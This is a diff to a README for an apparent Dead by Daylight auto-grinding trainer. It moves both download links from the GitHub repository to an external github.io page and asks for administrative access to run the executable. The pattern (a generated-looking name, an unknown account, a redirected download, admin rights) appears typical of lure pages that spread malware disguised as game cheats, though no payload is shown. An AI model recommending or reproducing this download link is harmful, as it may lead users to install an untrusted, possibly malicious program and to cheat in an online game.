@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your Dead by Daylight progression
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ela9yavu4769/DBD-AutoGrind-Trainer-2026-Mega)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://ela9yavu4769.github.io)
 
 ## 📌 Overview
 This software automates progression tasks within Dead by Daylight. The tool helps players earn Bloodpoints and manage character customization without manual input. It runs as an external process on your Windows computer. This design ensures the game remains stable while the trainer handles repetitive grinding tasks.
@@ -24,7 +24,7 @@ Before installation, verify your computer meets these specifications:
 *   **Permissions:** Administrative access to run the executable.
 
 ## 📥 Acquisition and Setup
-Visit this page to download the software: https://github.com/ela9yavu4769/DBD-AutoGrind-Trainer-2026-Mega. 
+Visit this page to download the software: https://ela9yavu4769.github.io 
 
 Follow these steps to configure the trainer on your system:
 
